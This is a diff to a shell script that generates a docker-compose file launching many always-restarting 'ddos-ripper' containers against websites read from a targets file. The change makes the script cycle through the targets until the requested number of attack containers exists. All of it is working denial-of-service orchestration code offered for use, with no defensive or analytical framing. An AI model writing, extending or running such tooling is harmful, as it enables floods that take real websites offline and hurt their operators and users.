@@ -41,17 +41,19 @@ function generate_compose {
     echo -e "services:" >> docker-compose.yml
     counter=1
 
-    while read -r site_url; do
-        if [ $counter -le $amount ]; then
-            if [ ! -z $site_url ]; then
-                echo -e "  ddos-runner-$counter:" >> docker-compose.yml
-                echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
-                echo -e "    restart: always" >> docker-compose.yml
-                echo -e "    command: $site_url" >> docker-compose.yml
-                ((counter++))
-            fi
-        fi
-    done < targets.txt
+    while [ $counter -le $amount ]; do
+      while read -r site_url; do
+          if [ $counter -le $amount ]; then
+              if [ ! -z $site_url ]; then
+                  echo -e "  ddos-runner-$counter:" >> docker-compose.yml
+                  echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
+                  echo -e "    restart: always" >> docker-compose.yml
+                  echo -e "    command: $site_url" >> docker-compose.yml
+                  ((counter++))
+              fi
+          fi
+      done < targets.txt
+    done
 }
 
 function ripper_start {
